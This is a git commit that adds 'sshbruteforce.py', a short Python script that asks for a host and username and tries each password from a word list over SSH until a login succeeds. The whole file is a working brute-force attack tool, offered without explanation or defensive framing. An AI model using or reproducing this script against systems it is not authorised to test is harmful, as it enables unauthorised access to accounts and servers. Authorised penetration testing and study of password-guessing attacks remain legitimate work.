f50ffa7ac7d8941752fac85dc2fd7d2d68cac8fa
Shivprasad Gudimella <72332303+NanuOp@users.noreply.github.com>
2024-06-15 17:49:45 +0530

    Create sshbruteforce.py

---
+++ sshbruteforce.py
@@ -0,0 +1,25 @@
+import os
+import paramiko.ssh_exception
+import requests
+from pwn import *
+import sys
+import paramiko
+
+host = input("Enter your Ip: ")
+username = input("Enter your username: ")
+attempts = 0
+
+with open ("passswords.txt", "r") as password_list:
+    for password in password_list:
+        password = password.strip("\n")
+        try:
+            print("[{}]Attempting password: '{}'". format(attempts, password))
+            response = ssh(host=host, user=username, password=password, timeout=1)
+            if response.connected():
+                print("Valid password found : '{}'".format(password))
+                response.close()
+                break
+            response.close
+        except paramiko.ssh_exception.AuthenticationException:
+            print("[>] Invalid password")
+        attempts +=1
